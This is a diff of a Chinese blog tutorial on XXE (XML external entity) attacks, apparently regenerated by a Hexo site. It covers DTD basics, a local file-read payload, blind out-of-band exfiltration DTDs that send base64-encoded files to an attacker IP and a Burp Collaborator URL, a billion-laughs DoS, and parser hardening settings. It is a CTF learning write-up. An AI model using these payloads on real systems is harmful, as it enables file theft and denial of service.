@@ -10,18 +10,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
     
     <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
-    <meta name="description" content="xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已    xml声明    根元素 必须有   George  4个子元素 子元素还可以有子元素   John   Reminder   Don&#39;t forget the meeting!   dtd 文档类型定义dtd的作用是定义xml文档的合法构建模块 内部dtd可被成行地声明于xml文档中，也可以作为一个外部引用">
+    <meta name="description" content="xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已 &lt;?xml version&#x3D;&quot;1.0&quot;?&gt;   xml声明 &lt;!DOCTYPE note [   内部的dtd 被包装在一个doctype声明中   &lt;!ELEMENT note (to,from,heading,body)&gt;   &lt;!ELEMENT to      (#PCDATA)&gt;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="xxe总结">
 <meta property="og:url" content="https://0xr1ngs.github.io/2018/06/02/xxe/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已    xml声明    根元素 必须有   George  4个子元素 子元素还可以有子元素   John   Reminder   Don&#39;t forget the meeting!   dtd 文档类型定义dtd的作用是定义xml文档的合法构建模块 内部dtd可被成行地声明于xml文档中，也可以作为一个外部引用">
+<meta property="og:description" content="xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已 &lt;?xml version&#x3D;&quot;1.0&quot;?&gt;   xml声明 &lt;!DOCTYPE note [   内部的dtd 被包装在一个doctype声明中   &lt;!ELEMENT note (to,from,heading,body)&gt;   &lt;!ELEMENT to      (#PCDATA)&gt;">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://0xr1ngs.github.io/2018/06/02/xxe/1.png">
 <meta property="og:image" content="https://0xr1ngs.github.io/2018/06/02/xxe/2.png">
 <meta property="og:image" content="https://0xr1ngs.github.io/2018/06/02/xxe/3.png">
 <meta property="article:published_time" content="2018-06-02T11:12:55.000Z">
-<meta property="article:modified_time" content="2023-07-10T09:15:33.882Z">
+<meta property="article:modified_time" content="2023-07-10T10:23:41.861Z">
 <meta property="article:author" content="r1ngs">
 <meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary">
@@ -31,13 +31,13 @@
 <link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
 
 
-    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688982682191">
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1688984800628">
     
-    <link rel="stylesheet" href="/css/style.css?v=1688982682191">
+    <link rel="stylesheet" href="/css/style.css?v=1688984800628">
 
     
         
-            <link rel="stylesheet" href="/custom.css?v=1688982682191">
+            <link rel="stylesheet" href="/custom.css?v=1688984800628">
         
     
 
@@ -46,7 +46,7 @@
 <script src="/lib/fancybox/fancybox.umd.js" async></script>
 
 
-    <script async src="/js/app.js?v=1688982682191"></script>
+    <script async src="/js/app.js?v=1688984800628"></script>
     
      
 
@@ -292,113 +292,113 @@
 </div>
 
     <h1 id="xml"><a href="#xml" class="headerlink" title="xml"></a>xml</h1><p>xml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已</p>
-<pre class="line-numbers language-XML"><code class="language-XML"><?xml version="1.0"?>   xml声明
-<!DOCTYPE note [   内部的dtd 被包装在一个doctype声明中
-  <!ELEMENT note (to,from,heading,body)>
-  <!ELEMENT to      (#PCDATA)>
-  <!ELEMENT from    (#PCDATA)>
-  <!ELEMENT heading (#PCDATA)>
-  <!ELEMENT body    (#PCDATA)>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>   xml声明
+<span class="token doctype">&lt;!DOCTYPE note [   内部的dtd 被包装在一个doctype声明中
+  &lt;!ELEMENT note (to,from,heading,body)></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
 ]>
-<note>  根元素 必须有
-  <to>George</to>  4个子元素 子元素还可以有子元素
-  <from>John</from>
-  <heading>Reminder</heading>
-  <body>Don't forget the meeting!</body>
-</note>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>  根元素 必须有
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>  4个子元素 子元素还可以有子元素
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h1 id="dtd-文档类型定义"><a href="#dtd-文档类型定义" class="headerlink" title="dtd 文档类型定义"></a>dtd 文档类型定义</h1><p>dtd的作用是定义xml文档的合法构建模块</p>
 <h2 id="内部"><a href="#内部" class="headerlink" title="内部"></a>内部</h2><p>dtd可被成行地声明于xml文档中，也可以作为一个外部引用</p>
-<pre class="line-numbers language-XML"><code class="language-XML"><!DOCTYPE note [  定义此文档是note类型的文档 
-  <!ELEMENT note (to,from,heading,body)>   定义note元素有四个子元素 
-  <!ELEMENT to      (#PCDATA)>  定义元素 类型为"#PCDATA" 
-  <!ELEMENT from    (#PCDATA)>
-  <!ELEMENT heading (#PCDATA)>
-  <!ELEMENT body    (#PCDATA)>
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token doctype">&lt;!DOCTYPE note [  定义此文档是note类型的文档 
+  &lt;!ELEMENT note (to,from,heading,body)></span>   定义note元素有四个子元素 
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span>      <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>  定义元素 类型为"#PCDATA" 
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span>    <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
 ]>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="外部"><a href="#外部" class="headerlink" title="外部"></a>外部</h2><p>dtd如果部署在外部，则应该这样声明</p>
-<pre class="line-numbers language-XML"><code class="language-XML"><?xml version="1.0"?>
-<!DOCTYPE note SYSTEM "note.dtd">
-<note>
-<to>George</to>
-<from>John</from>
-<heading>Reminder</heading>
-<body>Don't forget the meeting!</body>
-</note> 
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE note SYSTEM "note.dtd"></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span> 
 
 外部的note.dtd文件 
-<!ELEMENT note (to,from,heading,body)>
-<!ELEMENT to (#PCDATA)>
-<!ELEMENT from (#PCDATA)>
-<!ELEMENT heading (#PCDATA)>
-<!ELEMENT body (#PCDATA)>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">note</span> <span class="token attr-name">(to,from,heading,body)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">to</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">from</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">heading</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">body</span> <span class="token attr-name">(#PCDATA)</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量<br>实体可以在内部或者外部声明</p>
 <h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>一个实体由一个&amp;，一个实体名称，一个;构成</p>
-<pre class="line-numbers language-XML"><code class="language-XML"><!ENTITY writer "r1ngs">  在dtd里声明 
-<author>&writer;</author>  xml里引用 
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">writer</span> <span class="token attr-name">"r1ngs"</span><span class="token punctuation">></span></span>  在dtd里声明 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity" title="&writer;">&amp;writer;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>  xml里引用 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><pre class="line-numbers language-XML"><code class="language-XML"><!ENTITY writer SYSTEM "url">
-<author>&writer;</author>
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">writer</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">"url"</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>author</span><span class="token punctuation">></span></span><span class="token entity" title="&writer;">&amp;writer;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>author</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>仅仅在dtd中使用的解析实体为参数实体</p>
-<pre class="line-numbers language-XML"><code class="language-XML"><!ENTITY % writer "r1ngs">  内部 
-<!ENTITY % writer SYSTEM "url">  外部 
+<pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">writer</span> <span class="token attr-name">"r1ngs"</span><span class="token punctuation">></span></span>  内部 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">%</span> <span class="token attr-name">writer</span> <span class="token attr-name">SYSTEM</span> <span class="token attr-name">"url"</span><span class="token punctuation">></span></span>  外部 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>在dtd内引用： %writer;</p>
 <h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>php里的simplexml_load_string在旧版本里默认解析外部实体</p>
 <ul>
 <li>如果网站解析的xml是外部可控的，或者在与服务器交互的时候将json数据格式改为xml，都可能会导致服务器解析恶意的xml脚本</li>
 </ul>
-<h2 id="读取文件-x2F-x2F-不同程序支持协议不一样-读取失败的时候可以考虑php-x2F-x2F-filter"><a href="#读取文件-x2F-x2F-不同程序支持协议不一样-读取失败的时候可以考虑php-x2F-x2F-filter" class="headerlink" title="读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter"></a>读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter</h2><pre class="line-numbers language-XML"><code class="language-XML"><?xml version="1.0"?>
-<!DOCTYPE ANY [ 
-<!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt" >
+<h2 id="读取文件-x2F-x2F-不同程序支持协议不一样-读取失败的时候可以考虑php-x2F-x2F-filter"><a href="#读取文件-x2F-x2F-不同程序支持协议不一样-读取失败的时候可以考虑php-x2F-x2F-filter" class="headerlink" title="读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter"></a>读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter</h2><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
+<span class="token doctype">&lt;!DOCTYPE ANY [ 
+&lt;!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt" ></span>
 ]>
-<aaa>&xxe;</aaa>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>aaa</span><span class="token punctuation">></span></span><span class="token entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>aaa</span><span class="token punctuation">></span></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>没有数据回显的时候<br>有的解析器不能在实体定义的时候引用参数实体，所以要把声明放到攻击者的服务器<br>漏洞复现：</p>
-<pre class="line-numbers language-PHP"><code class="language-PHP"><?php 
-header("Content-type: text/html; charset=utf-8");  
-echo "<h3>xxe test！</h3>";  
-$xml = '<!DOCTYPE ANY [  
-<!ENTITY % remote SYSTEM "http://192.168.41.1:81/evil.dtd">  
-%remote;  
-%param1;
-]>  
-<root>&external;</root>';  
-try{   
-$doc = simplexml_load_string($xml);  
-}   
-catch(Exception $e){   
-print "error";   
-}  
-?>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-type: text/html; charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token keyword">echo</span> <span class="token string">"&lt;h3>xxe test！&lt;/h3>"</span><span class="token punctuation">;</span>  
+<span class="token variable">$xml</span> <span class="token operator">=</span> '<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> <span class="token constant">ANY</span> <span class="token punctuation">[</span>  
+<span class="token markup">&lt;!ENTITY % remote SYSTEM "http://192.168.41.1:81/evil.dtd"></span>  
+<span class="token operator">%</span>remote<span class="token punctuation">;</span>  
+<span class="token operator">%</span>param1<span class="token punctuation">;</span>
+<span class="token punctuation">]</span><span class="token operator">></span>  
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>external<span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span>  
+<span class="token keyword">try</span><span class="token punctuation">{</span>   
+<span class="token variable">$doc</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+<span class="token punctuation">}</span>   
+<span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   
+<span class="token keyword">print</span> <span class="token string">"error"</span><span class="token punctuation">;</span>   
+<span class="token punctuation">}</span>  
+<span class="token delimiter">?></span>
 
 远程的dtd文件
-<!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=1.txt">  
-<!ENTITY % param1 "<!ENTITY  external SYSTEM 'http://192.168.41.1:81/1.php?file=%payload;'>">
+<span class="token markup">&lt;!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=1.txt"></span>  
+<span class="token markup">&lt;!ENTITY % param1 "&lt;!ENTITY  external SYSTEM 'http://192.168.41.1:81/1.php?file=%payload;'></span>"<span class="token operator">></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h2><pre class="line-numbers language-XML"><code class="language-XML"><?xml version = "1.0"?>  
-<!DOCTYPE lolz [
-<!ENTITY lol "lol">  
-<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">  
-<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">  
-<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">   
-<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">   
-<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">  
-<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">   
-<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">   
-<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">  
-<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+<h2 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h2><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version = "1.0"?></span>  
+<span class="token doctype">&lt;!DOCTYPE lolz [
+&lt;!ENTITY lol "lol"></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol1</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span>   
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span>
 ]>  
-<lolz>&lol9;</lolz>  
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span>  
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>还有执行系统命令，探测内网端口等效果</p>
 <h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ul>
 <li>禁止使用外部实体</li>
 </ul>
-<pre><code>PHP：
+<pre class="line-numbers language-xml"><code class="language-xml">PHP：
 libxml_disable_entity_loader(true);
 
 JAVA:
@@ -408,27 +408,27 @@ dbf.setExpandEntityReferences(false);
 Python：
 from lxml import etree
 xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
-</code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <ul>
 <li>过滤用户提交的xml数据</li>
 </ul>
 <h1 id="赛总♂牛逼"><a href="#赛总♂牛逼" class="headerlink" title="赛总♂牛逼"></a>赛总♂牛逼</h1><p>在写这篇文章的时候翻了一下之前和赛总的聊天记录，赛总之前教了我一个没有vps也能实现blind xxe的黑魔法</p>
 <h2 id="burp-collaborator-client"><a href="#burp-collaborator-client" class="headerlink" title="burp collaborator client"></a>burp collaborator client</h2><p>burp里的这个功能可以随机生成一条由burp.collaborator.server分给你的链接，任何访问了这个链接的请求都会被记录下来，当关掉这个面板的时候链接失效<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/06/02/xxe/1.png" alt="1" data-caption="1" loading="lazy"></p>
 <h2 id="github"><a href="#github" class="headerlink" title="github"></a>github</h2><p>github上可以托管代码文件，raw功能预览代码，此时url就可以作为远程文件的链接</p>
-<pre><code>https://raw.githubusercontent.com/R1ng6/CTFtool/master/evil.dtd
-</code></pre>
+<pre class="line-numbers language-xml"><code class="language-xml">https://raw.githubusercontent.com/R1ng6/CTFtool/master/evil.dtd
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>但是当时我找了一个普通的xxe的ctf题目，发现调用参数实体的时候无法访问dtd文件里面指向的collaborator链接<br>后来发现是默认不支持协议<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/06/02/xxe/2.png" alt="1" data-caption="1" loading="lazy"><br>github上的链接是https协议，php默认不支持</p>
 <h2 id="搭博客，买域名"><a href="#搭博客，买域名" class="headerlink" title="搭博客，买域名"></a>搭博客，买域名</h2><p>正好之前用github搭建了博客，还买了域名进行重定向，用域名访问博客地址就是http协议，于是我马上试了一下<br>在靶机里面的xml</p>
-<pre class="line-numbers language-XML"><code class="language-XML">$xml = '<!DOCTYPE ANY [  
-<!ENTITY % remote SYSTEM "http://r1ngs.top/test.dtd">  
+<pre class="line-numbers language-xml"><code class="language-xml">$xml = '<span class="token doctype">&lt;!DOCTYPE ANY [  
+&lt;!ENTITY % remote SYSTEM "http://r1ngs.top/test.dtd"></span>  
 %remote;  
 %param1;
 ]>  
-<root>&external;</root>';
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token entity" title="&external;">&amp;external;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span>';
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>github上的dtd</p>
-<pre class="line-numbers language-XML"><code class="language-XML"><!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=1.txt">  
-<!ENTITY % param1 "<!ENTITY  external SYSTEM 'http://xcd123kik2apvsgubws336a9107qvf.burpcollaborator.net/?flag=%payload;'>">
+<pre class="line-numbers language-xml"><code class="language-xml">&lt;!ENTITY % payload SYSTEM "php://filter/convert.base64-encode/resource=1.txt">  
+&lt;!ENTITY % param1 "&lt;!ENTITY  external SYSTEM 'http://xcd123kik2apvsgubws336a9107qvf.burpcollaborator.net/?flag=%payload;'>">
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>只是不知道为什么github上只能命名为dtd，如果是xml的话访问链接会报404<br>最后成功读取到了靶机目录下的1.txt文件<br><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2018/06/02/xxe/3.png" alt="1" data-caption="1" loading="lazy"></p>
 
@@ -448,7 +448,7 @@ xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
 </div>
   
   
-    <script async src="/js/copy-codeblock.js?v=1688982682121"></script>
+    <script async src="/js/copy-codeblock.js?v=1688984800556"></script>
   
 
   
